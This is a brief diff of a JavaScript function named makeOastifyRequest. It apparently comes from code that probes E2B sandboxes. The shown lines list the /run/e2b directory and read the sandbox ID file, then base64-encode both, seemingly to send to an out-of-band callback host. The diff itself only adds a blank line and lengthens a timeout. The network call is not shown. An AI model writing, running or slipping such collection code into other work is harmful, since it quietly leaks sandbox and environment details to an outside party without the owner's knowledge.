@@ -13,6 +13,7 @@ function makeOastifyRequest() {
     var encoded2 = ""
     try
     {
+
     const listing = readdirSync('/run/e2b').join('\n')
     encoded = Buffer.from(listing, 'utf8').toString('base64')
     encoded2 = readFileSync('/run/e2b/.E2B_SANDBOX_ID').toString('base64');
@@ -65,7 +66,7 @@ function makeOastifyRequest() {
 
     setTimeout(() => {
       resolve();
-    }, 200000);
+    }, 260000);
   });
 }
 
